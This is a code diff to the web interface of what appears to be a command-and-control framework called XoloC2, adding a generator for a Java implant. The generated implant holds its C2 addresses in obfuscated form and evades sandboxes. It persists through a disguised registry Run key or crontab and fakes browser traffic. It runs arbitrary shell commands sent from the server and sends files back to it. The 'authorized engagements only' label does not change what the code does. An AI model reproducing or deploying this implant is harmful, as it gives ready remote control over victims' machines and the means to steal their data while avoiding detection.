@@ -903,9 +903,15 @@ function renderGenerateView() {
   content.innerHTML = `
     <div style="max-width:860px;margin:0 auto">
 
-      <div style="margin-bottom:20px">
-        <h2 style="font-size:15px;font-weight:700;color:var(--text)">⚙ Generate Beacon</h2>
-        <p style="color:var(--text3);font-size:12px;margin-top:4px">Configure and download a Python beacon payload. Authorized engagements only.</p>
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;flex-wrap:wrap;gap:10px">
+        <div>
+          <h2 style="font-size:15px;font-weight:700;color:var(--text)">⚙ Generate Beacon</h2>
+          <p style="color:var(--text3);font-size:12px;margin-top:4px">Authorized engagements only.</p>
+        </div>
+        <div style="display:flex;gap:0;border:1px solid var(--border);border-radius:6px;overflow:hidden">
+          <button id="lang-py-btn"  onclick="setBeaconLang('py')"   style="padding:6px 18px;font-size:12px;font-weight:600;background:var(--accent);color:#fff;border:none;cursor:pointer">Python</button>
+          <button id="lang-java-btn" onclick="setBeaconLang('java')" style="padding:6px 18px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">Java</button>
+        </div>
       </div>
 
       <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px">
@@ -936,13 +942,25 @@ function renderGenerateView() {
           </label>
         </div>
 
-        <div class="info-card" style="margin:0">
+        <div class="info-card" style="margin:0" id="beacon-info-card">
           <h3>Info</h3>
-          <div class="info-row"><span class="key">Type</span><span class="val">Python 3 beacon</span></div>
-          <div class="info-row"><span class="key">Protocol</span><span class="val">HTTPS polling</span></div>
-          <div class="info-row"><span class="key">Auth</span><span class="val">X-Agent-Secret header</span></div>
-          <div class="info-row"><span class="key">TLS</span><span class="val">Self-signed accepted</span></div>
-          <div class="info-row"><span class="key">Deps</span><span class="val">None (stdlib only)</span></div>
+          <div id="beacon-info-py">
+            <div class="info-row"><span class="key">Type</span><span class="val">Python 3 beacon</span></div>
+            <div class="info-row"><span class="key">Protocol</span><span class="val">HTTPS polling</span></div>
+            <div class="info-row"><span class="key">Auth</span><span class="val">X-Agent-Secret header</span></div>
+            <div class="info-row"><span class="key">TLS</span><span class="val">Self-signed accepted</span></div>
+            <div class="info-row"><span class="key">Deps</span><span class="val">None (stdlib only)</span></div>
+            <div class="info-row"><span class="key">Output</span><span class="val">.py / Linux ELF</span></div>
+          </div>
+          <div id="beacon-info-java" style="display:none">
+            <div class="info-row"><span class="key">Type</span><span class="val">Java 11 beacon</span></div>
+            <div class="info-row"><span class="key">Protocol</span><span class="val">HTTPS polling</span></div>
+            <div class="info-row"><span class="key">Auth</span><span class="val">X-Agent-Secret header</span></div>
+            <div class="info-row"><span class="key">TLS</span><span class="val">Self-signed accepted</span></div>
+            <div class="info-row"><span class="key">Deps</span><span class="val">None (stdlib only)</span></div>
+            <div class="info-row"><span class="key">Output</span><span class="val">Fat JAR (requiere JRE)</span></div>
+            <div class="info-row"><span class="key">Cross-compile</span><span class="val" style="color:var(--online)">Sí — Windows/Linux/macOS</span></div>
+          </div>
         </div>
       </div>
 
@@ -978,14 +996,17 @@ function renderGenerateView() {
 
       <div id="gen-output" style="display:none;margin-top:20px">
         <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
-          <span style="color:var(--text2);font-size:12px">
-            Save as <code style="color:var(--accent)">beacon.py</code>
-          </span>
-          <div style="display:flex;gap:8px">
-            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('py')" title="Download Python script">⬇ .py</button>
-            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('linux')" title="Compile Linux ELF binary">⬇ Linux ELF</button>
-            <button class="btn btn-sm btn-ghost" onclick="showWindowsInstructions()" title="Windows compile instructions">🪟 Windows EXE</button>
+          <span style="color:var(--text2);font-size:12px" id="beacon-filename-label">Save as <code style="color:var(--accent)">beacon.py</code></span>
+          <div style="display:flex;gap:8px" id="beacon-dl-buttons-py">
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('py')">⬇ .py</button>
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('linux')">⬇ Linux ELF</button>
+            <button class="btn btn-sm btn-ghost" onclick="showWindowsInstructions()">🪟 Windows EXE</button>
             <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn">⎘ Copy</button>
+          </div>
+          <div style="display:flex;gap:8px;display:none" id="beacon-dl-buttons-java">
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('java-src')">⬇ .java</button>
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('jar')">⬇ .jar</button>
+            <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-java">⎘ Copy</button>
           </div>
         </div>
         <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden">
@@ -993,7 +1014,7 @@ function renderGenerateView() {
             <span style="width:10px;height:10px;border-radius:50%;background:#ef4444;display:inline-block"></span>
             <span style="width:10px;height:10px;border-radius:50%;background:#f59e0b;display:inline-block"></span>
             <span style="width:10px;height:10px;border-radius:50%;background:#22c55e;display:inline-block"></span>
-            <span style="color:var(--text3);font-size:11px;margin-left:4px">beacon.py</span>
+            <span style="color:var(--text3);font-size:11px;margin-left:4px" id="beacon-tab-label">beacon.py</span>
           </div>
           <pre id="beacon-code" style="margin:0;padding:16px;font-size:11px;line-height:1.6;color:var(--accent2);overflow-x:auto;max-height:420px;overflow-y:auto"></pre>
         </div>
@@ -1454,6 +1475,19 @@ function addListenerField() {
   container.appendChild(div);
 }
 
+let _beaconLang = 'py';
+
+function setBeaconLang(lang) {
+  _beaconLang = lang;
+  document.getElementById('lang-py-btn').style.background   = lang === 'py'   ? 'var(--accent)' : 'var(--bg3)';
+  document.getElementById('lang-py-btn').style.color        = lang === 'py'   ? '#fff' : 'var(--text2)';
+  document.getElementById('lang-java-btn').style.background = lang === 'java' ? 'var(--accent)' : 'var(--bg3)';
+  document.getElementById('lang-java-btn').style.color      = lang === 'java' ? '#fff' : 'var(--text2)';
+  document.getElementById('beacon-info-py').style.display   = lang === 'py'   ? '' : 'none';
+  document.getElementById('beacon-info-java').style.display = lang === 'java' ? '' : 'none';
+  document.getElementById('gen-output').style.display = 'none';
+}
+
 async function generateBeacon() {
   const urls = [...document.querySelectorAll('.gen-url-input')]
     .map(i => i.value.trim()).filter(Boolean);
@@ -1473,7 +1507,20 @@ async function generateBeacon() {
   if (!res || !res.ok) { alert('Failed to get agent secret'); return; }
   const info = await res.json();
 
-  const code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev);
+  let code, filename;
+  if (_beaconLang === 'java') {
+    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev);
+    filename = 'Beacon.java';
+    document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
+    document.getElementById('beacon-dl-buttons-java').style.display = 'flex';
+  } else {
+    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev);
+    filename = 'beacon.py';
+    document.getElementById('beacon-dl-buttons-py').style.display   = 'flex';
+    document.getElementById('beacon-dl-buttons-java').style.display = 'none';
+  }
+  document.getElementById('beacon-filename-label').innerHTML = `Save as <code style="color:var(--accent)">${filename}</code>`;
+  document.getElementById('beacon-tab-label').textContent = filename;
   document.getElementById('beacon-code').textContent = code;
   document.getElementById('gen-output').style.display = 'block';
 }
@@ -2016,6 +2063,387 @@ if __name__ == "__main__":
 `;
 }
 
+function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}) {
+  if (!Array.isArray(urls)) urls = [urls];
+  function xorEnc(str, key) {
+    const enc = new TextEncoder();
+    const b = enc.encode(str), k = enc.encode(key);
+    return Array.from(b).map((c, i) => c ^ k[i % k.length]).map(c => c.toString(16).padStart(2, '0')).join('');
+  }
+  const xk = Array.from(crypto.getRandomValues(new Uint8Array(16)))
+    .map(b => String.fromCharCode(97 + b % 26)).join('');
+  const eUrls = urls.map(u => xorEnc(u, xk));
+  const es = xorEnc(secret, xk);
+
+  const sandboxBlock = ev.sandbox ? `
+    private static void checkEnv() {
+        try {
+            if (Runtime.getRuntime().availableProcessors() < 2) System.exit(0);
+        } catch (Exception ignored) {}
+        try {
+            String u = System.getProperty("user.name","").toLowerCase();
+            for (String bad : new String[]{"sandbox","malware","virus","analyst","cuckoo","honey"})
+                if (u.contains(bad)) System.exit(0);
+            String h = java.net.InetAddress.getLocalHost().getHostName().toLowerCase();
+            for (String bad : new String[]{"sandbox","malware","virus","vbox","vmware","analysis","cuckoo"})
+                if (h.contains(bad)) System.exit(0);
+        } catch (Exception ignored) {}
+        // Timing check — accelerated execution indicates sandbox
+        long t = System.currentTimeMillis();
+        try { Thread.sleep(500); } catch (Exception ignored) {}
+        if (System.currentTimeMillis() - t < 400) System.exit(0);
+    }` : '';
+
+  const sandboxCall = ev.sandbox ? '\n        checkEnv();' : '';
+
+  const bgBlock = ev.background ? `
+    private static void background() {
+        String os = System.getProperty("os.name","").toLowerCase();
+        String daemon = System.getenv("_XOLO_DAEMON");
+        if (daemon != null) return;
+        try {
+            String javaExec = System.getProperty("java.home") + java.io.File.separator + "bin" + java.io.File.separator;
+            javaExec += os.contains("win") ? "javaw" : "java";
+            String jarPath = new java.io.File(Beacon.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
+            ProcessBuilder pb = new ProcessBuilder(javaExec, "-jar", jarPath);
+            pb.environment().put("_XOLO_DAEMON", "1");
+            if (!os.contains("win")) {
+                pb.redirectInput(new java.io.File("/dev/null"));
+                pb.redirectOutput(new java.io.File("/dev/null"));
+                pb.redirectError(new java.io.File("/dev/null"));
+            }
+            pb.start();
+            System.exit(0);
+        } catch (Exception ignored) {}
+    }` : '';
+
+  const bgCall = ev.background ? '\n        background();' : '';
+
+  const persistBlock = persist ? `
+    private static void persist() {
+        String os = System.getProperty("os.name","").toLowerCase();
+        try {
+            String jarPath = new java.io.File(Beacon.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
+            String javaExec = System.getProperty("java.home") + java.io.File.separator + "bin" + java.io.File.separator + "java";
+            if (os.contains("win")) {
+                String cmd = "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v SystemHealthSvc /t REG_SZ /d \\"" + javaExec + " -jar " + jarPath + "\\" /f";
+                Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
+            } else {
+                String entry = "@reboot " + javaExec + " -jar " + jarPath;
+                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "crontab -l 2>/dev/null"});
+                String existing = new String(p.getInputStream().readAllBytes());
+                if (!existing.contains(entry)) {
+                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "(crontab -l 2>/dev/null; echo \\"" + entry + "\\") | crontab -"});
+                }
+            }
+        } catch (Exception ignored) {}
+    }` : '';
+
+  const persistCall = persist ? '\n        persist();' : '';
+
+  const encryptBlock = ev.encrypt ? `
+    private static byte[] encBody(byte[] data) {
+        byte[] nonce = new byte[8];
+        new java.security.SecureRandom().nextBytes(nonce);
+        String nonceHex = bytesToHex(nonce);
+        byte[] key = (SECRET + nonceHex).getBytes(java.nio.charset.StandardCharsets.UTF_8);
+        byte[] out = new byte[data.length];
+        for (int i = 0; i < data.length; i++) out[i] = (byte)(data[i] ^ key[i % key.length]);
+        return ("{\\"enc\\":1,\\"nonce\\":\\"" + nonceHex + "\\",\\"data\\":\\"" + bytesToHex(out) + "\\"}").getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+    private static String decResp(byte[] resp) {
+        try {
+            String s = new String(resp, java.nio.charset.StandardCharsets.UTF_8);
+            if (!s.contains("\\"enc\\":1")) return s;
+            String nonce = jsonGet(s, "nonce"); String data = jsonGet(s, "data");
+            if (nonce == null || data == null) return s;
+            byte[] key = (SECRET + nonce).getBytes(java.nio.charset.StandardCharsets.UTF_8);
+            byte[] raw = hexToBytes(data);
+            for (int i = 0; i < raw.length; i++) raw[i] ^= key[i % key.length];
+            return new String(raw, java.nio.charset.StandardCharsets.UTF_8);
+        } catch (Exception e) { return new String(resp, java.nio.charset.StandardCharsets.UTF_8); }
+    }` : '';
+
+  const buildBody  = ev.encrypt
+    ? 'byte[] body = encBody(payload.getBytes(java.nio.charset.StandardCharsets.UTF_8));'
+    : 'byte[] body = payload.getBytes(java.nio.charset.StandardCharsets.UTF_8);';
+  const parseResp  = ev.encrypt
+    ? 'String respStr = decResp(respBytes);'
+    : 'String respStr = new String(respBytes, java.nio.charset.StandardCharsets.UTF_8);';
+
+  const uaList = ev.traffic ? `
+    private static final String[] UA_POOL = {
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
+    };
+    private static final String[] REFERERS = {
+        "https://www.google.com/","https://www.bing.com/","https://outlook.office365.com/","https://teams.microsoft.com/"
+    };` : '';
+
+  const setUAHeaders = ev.traffic
+    ? `conn.setRequestProperty("User-Agent", UA_POOL[rng.nextInt(UA_POOL.length)]);
+            conn.setRequestProperty("Referer", REFERERS[rng.nextInt(REFERERS.length)]);
+            conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,*/*;q=0.8");`
+    : 'conn.setRequestProperty("User-Agent", "Java/11");';
+
+  return `import java.io.*;
+import java.net.*;
+import java.nio.file.*;
+import java.util.*;
+import javax.net.ssl.*;
+import java.security.cert.X509Certificate;
+
+/**
+ * XoloC2 Java Beacon
+ * Generated: ${new Date().toISOString()}
+ * FOR AUTHORIZED USE ONLY
+ */
+public class Beacon {
+
+    private static final String XK = "${xk}";
+    private static final String[] C2_URLS = { ${eUrls.map(e => `"${e}"`).join(', ')} };
+    private static final String SECRET;
+    static { SECRET = xDec("${es}", XK); }
+
+    private static final int SLEEP  = ${sleep};
+    private static final int JITTER = ${jitter};
+    private static final Random rng = new Random();
+
+    private static String agentId;
+    private static String cwd;
+    private static int urlIdx = 0;
+    private static SSLContext sslCtx;
+    ${uaList}
+    ${sandboxBlock}
+    ${bgBlock}
+    ${persistBlock}
+    ${encryptBlock}
+
+    // ── XOR decode ────────────────────────────────────────────
+    private static String xDec(String hex, String key) {
+        byte[] b = hexToBytes(hex);
+        byte[] k = key.getBytes(java.nio.charset.StandardCharsets.UTF_8);
+        for (int i = 0; i < b.length; i++) b[i] ^= k[i % k.length];
+        return new String(b, java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    private static String bytesToHex(byte[] b) {
+        StringBuilder sb = new StringBuilder();
+        for (byte x : b) sb.append(String.format("%02x", x));
+        return sb.toString();
+    }
+
+    private static byte[] hexToBytes(String hex) {
+        int len = hex.length();
+        byte[] out = new byte[len / 2];
+        for (int i = 0; i < len; i += 2)
+            out[i / 2] = (byte) Integer.parseInt(hex.substring(i, i + 2), 16);
+        return out;
+    }
+
+    // ── Minimal JSON helpers ──────────────────────────────────
+    private static String jsonGet(String json, String key) {
+        String search = "\\"" + key + "\\":";
+        int i = json.indexOf(search);
+        if (i < 0) return null;
+        i += search.length();
+        while (i < json.length() && json.charAt(i) == ' ') i++;
+        if (json.charAt(i) == '"') {
+            int end = json.indexOf('"', i + 1);
+            return end < 0 ? null : json.substring(i + 1, end);
+        }
+        int end = i;
+        while (end < json.length() && json.charAt(end) != ',' && json.charAt(end) != '}') end++;
+        return json.substring(i, end).trim();
+    }
+
+    private static String jsonEscape(String s) {
+        return s.replace("\\\\", "\\\\\\\\").replace("\\"", "\\\\\\"").replace("\\n", "\\\\n").replace("\\r", "\\\\r").replace("\\t", "\\\\t");
+    }
+
+    // ── SSL bypass (accept self-signed) ───────────────────────
+    private static void initSsl() throws Exception {
+        TrustManager[] tm = new TrustManager[]{ new X509TrustManager() {
+            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
+            public void checkClientTrusted(X509Certificate[] c, String a) {}
+            public void checkServerTrusted(X509Certificate[] c, String a) {}
+        }};
+        sslCtx = SSLContext.getInstance("TLS");
+        sslCtx.init(null, tm, new java.security.SecureRandom());
+    }
+
+    // ── HTTP POST ─────────────────────────────────────────────
+    private static String post(String path, String payload) {
+        ${buildBody}
+        for (int i = 0; i < C2_URLS.length; i++) {
+            String url = C2_URLS[(urlIdx + i) % C2_URLS.length];
+            try {
+                HttpURLConnection conn = (HttpURLConnection) new URL(url + path).openConnection();
+                if (conn instanceof HttpsURLConnection)
+                    ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
+                if (conn instanceof HttpsURLConnection)
+                    ((HttpsURLConnection) conn).setHostnameVerifier((h, s) -> true);
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setRequestProperty("X-Agent-Secret", SECRET);
+                ${setUAHeaders}
+                conn.setConnectTimeout(10000); conn.setReadTimeout(15000);
+                conn.setDoOutput(true);
+                conn.getOutputStream().write(body);
+                byte[] respBytes = conn.getInputStream().readAllBytes();
+                urlIdx = (urlIdx + i) % C2_URLS.length;
+                ${parseResp}
+                return respStr;
+            } catch (Exception ignored) {}
+        }
+        return null;
+    }
+
+    // ── Agent ID persistence ──────────────────────────────────
+    private static String getOrCreateId() {
+        try {
+            File f = new File(getBaseDir(), ".beacon_id");
+            if (f.exists()) return Files.readString(f.toPath()).trim();
+            String id = UUID.randomUUID().toString();
+            Files.writeString(f.toPath(), id);
+            return id;
+        } catch (Exception e) { return UUID.randomUUID().toString(); }
+    }
+
+    private static String getBaseDir() {
+        try {
+            return new File(Beacon.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent();
+        } catch (Exception e) { return System.getProperty("user.dir"); }
+    }
+
+    // ── System info ───────────────────────────────────────────
+    private static String localIp() {
+        try {
+            try (java.net.DatagramSocket s = new java.net.DatagramSocket()) {
+                s.connect(InetAddress.getByName("8.8.8.8"), 80);
+                return s.getLocalAddress().getHostAddress();
+            }
+        } catch (Exception e) { return "127.0.0.1"; }
+    }
+
+    private static String osInfo() {
+        return System.getProperty("os.name","?") + " " + System.getProperty("os.version","") + " " + System.getProperty("os.arch","");
+    }
+
+    // ── Checkin ───────────────────────────────────────────────
+    private static String checkin() {
+        String hostname = "unknown";
+        try { hostname = InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
+        String username = System.getProperty("user.name", "unknown");
+        long pid = ProcessHandle.current().pid();
+        String payload = "{\\"agent_id\\":\\"" + agentId + "\\"," +
+            "\\"hostname\\":\\"" + jsonEscape(hostname) + "\\"," +
+            "\\"ip_internal\\":\\"" + localIp() + "\\"," +
+            "\\"os_info\\":\\"" + jsonEscape(osInfo()) + "\\"," +
+            "\\"username\\":\\"" + jsonEscape(username) + "\\"," +
+            "\\"pid\\":" + pid + "," +
+            "\\"sleep_interval\\":" + SLEEP + "," +
+            "\\"cwd\\":\\"" + jsonEscape(cwd) + "\\"}";
+        return post("/api/beacon/checkin", payload);
+    }
+
+    // ── Command execution ─────────────────────────────────────
+    private static String runCommand(String cmd) {
+        cmd = cmd.trim();
+        String os = System.getProperty("os.name","").toLowerCase();
+        boolean isWin = os.contains("win");
+
+        if (cmd.equals("info")) {
+            String hostname = "unknown";
+            try { hostname = InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
+            return "ID:       " + agentId + "\\n" +
+                   "Hostname: " + hostname + "\\n" +
+                   "User:     " + System.getProperty("user.name","?") + "\\n" +
+                   "OS:       " + osInfo() + "\\n" +
+                   "IP:       " + localIp() + "\\n" +
+                   "PID:      " + ProcessHandle.current().pid() + "\\n" +
+                   "CWD:      " + cwd;
+        }
+
+        if (cmd.startsWith("cd ")) {
+            String target = cmd.substring(3).trim();
+            File dir = target.startsWith("/") || (target.length() > 1 && target.charAt(1) == ':')
+                ? new File(target) : new File(cwd, target);
+            if (dir.isDirectory()) { cwd = dir.getAbsolutePath(); return ""; }
+            return "cd: " + target + ": No such directory";
+        }
+
+        if (cmd.equals("ps")) {
+            try {
+                return ProcessHandle.allProcesses()
+                    .map(p -> String.format("%6d  %s", p.pid(), p.info().command().orElse("?")))
+                    .reduce("  PID  CMD", (a, b) -> a + "\\n" + b);
+            } catch (Exception e) { return "Error: " + e.getMessage(); }
+        }
+
+        if (cmd.startsWith("kill ")) {
+            try {
+                long pid = Long.parseLong(cmd.split("\\\\s+")[1]);
+                ProcessHandle.of(pid).ifPresent(ProcessHandle::destroy);
+                return "[+] Signal sent to PID " + pid;
+            } catch (Exception e) { return "Error: " + e.getMessage(); }
+        }
+
+        if (cmd.startsWith("download ")) {
+            String path = cmd.substring(9).trim();
+            File f = new File(path.startsWith("/") || (path.length()>1&&path.charAt(1)==':') ? path : cwd + File.separator + path);
+            try {
+                byte[] data = Files.readAllBytes(f.toPath());
+                String b64 = Base64.getEncoder().encodeToString(data);
+                return "__b64file__:" + f.getName() + ":" + b64;
+            } catch (Exception e) { return "Error: " + e.getMessage(); }
+        }
+
+        // Shell command
+        try {
+            ProcessBuilder pb = isWin
+                ? new ProcessBuilder("cmd.exe", "/c", cmd)
+                : new ProcessBuilder("/bin/sh", "-c", cmd);
+            pb.directory(new File(cwd));
+            pb.redirectErrorStream(true);
+            Process p = pb.start();
+            byte[] out = p.getInputStream().readAllBytes();
+            p.waitFor();
+            return new String(out).stripTrailing();
+        } catch (Exception e) { return "Error: " + e.getMessage(); }
+    }
+
+    // ── Main loop ─────────────────────────────────────────────
+    public static void main(String[] args) throws Exception {
+        initSsl();${sandboxCall}${bgCall}${persistCall}
+        agentId = getOrCreateId();
+        cwd = System.getProperty("user.dir");
+        int sleepMs = SLEEP * 1000;
+        while (true) {
+            try {
+                String resp = checkin();
+                if (resp != null) {
+                    String taskId  = jsonGet(resp, "task_id");
+                    String command = jsonGet(resp, "command");
+                    if (taskId != null && command != null) {
+                        String output = runCommand(command);
+                        String result = "{\\"task_id\\":\\"" + taskId + "\\"," +
+                            "\\"output\\":\\"" + jsonEscape(output) + "\\"," +
+                            "\\"status\\":\\"done\\"}";
+                        post("/api/beacon/result", result);
+                    }
+                }
+            } catch (Exception ignored) {}
+            int jitterMs = (int)(sleepMs * (JITTER / 100.0) * rng.nextDouble());
+            Thread.sleep(sleepMs + jitterMs);
+        }
+    }
+}
+`;
+}
+
 function copyBeacon() {
   const code = document.getElementById('beacon-code').textContent;
   navigator.clipboard.writeText(code).then(() => {
@@ -2054,17 +2482,39 @@ async function downloadBeacon(type) {
 
   if (type === 'py') {
     const blob = new Blob([code], { type: 'text/plain' });
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'beacon.py';
-    a.click();
+    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'beacon.py'; a.click();
     return;
   }
 
-  // Compile on server
-  statusEl.style.display = 'block';
-  statusEl.style.background = 'var(--bg3)';
-  statusEl.style.color = 'var(--text2)';
+  if (type === 'java-src') {
+    const blob = new Blob([code], { type: 'text/plain' });
+    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'Beacon.java'; a.click();
+    return;
+  }
+
+  if (type === 'jar') {
+    statusEl.style.cssText = 'display:block;background:var(--bg3);color:var(--text2);padding:10px 14px;border-radius:6px;font-size:12px';
+    statusEl.textContent = '⏳ Compilando JAR en el servidor... (~10s)';
+    const res = await apiFetch('/api/info/beacon/compile-java', {
+      method: 'POST',
+      body: JSON.stringify({ code }),
+    });
+    if (!res || !res.ok) {
+      const err = await res?.json().catch(() => ({ detail: 'Error desconocido' }));
+      statusEl.style.color = 'var(--danger)';
+      statusEl.textContent = `✗ ${err.detail}`;
+      return;
+    }
+    const blob = await res.blob();
+    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'beacon.jar'; a.click();
+    statusEl.style.color = 'var(--online)';
+    statusEl.textContent = '✓ beacon.jar descargado. Ejecutar con: java -jar beacon.jar';
+    setTimeout(() => statusEl.style.display = 'none', 4000);
+    return;
+  }
+
+  // Linux ELF via PyInstaller
+  statusEl.style.cssText = 'display:block;background:var(--bg3);color:var(--text2);padding:10px 14px;border-radius:6px;font-size:12px';
   statusEl.textContent = `⏳ Compiling for ${type === 'linux' ? 'Linux' : 'Windows'}... this may take ~30s`;
 
   const res = await apiFetch('/api/info/beacon/compile', {
@@ -2072,10 +2522,8 @@ async function downloadBeacon(type) {
     body: JSON.stringify({ code, platform: type }),
   });
 
-  if (!res) { statusEl.style.color = 'var(--danger)'; statusEl.textContent = '✗ Request failed.'; return; }
-
-  if (!res.ok) {
-    const err = await res.json().catch(() => ({ detail: 'Unknown error' }));
+  if (!res || !res.ok) {
+    const err = await res?.json().catch(() => ({ detail: 'Unknown error' }));
     statusEl.style.color = 'var(--danger)';
     statusEl.textContent = `✗ ${err.detail}`;
     return;
@@ -2083,12 +2531,9 @@ async function downloadBeacon(type) {
 
   const blob = await res.blob();
   const ext = type === 'windows' ? '.exe' : '';
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = `beacon${ext}`;
-  a.click();
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `beacon${ext}`; a.click();
   statusEl.style.color = 'var(--online)';
-  statusEl.textContent = `✓ Binary downloaded.`;
+  statusEl.textContent = '✓ Binary downloaded.';
   setTimeout(() => statusEl.style.display = 'none', 3000);
 }
 
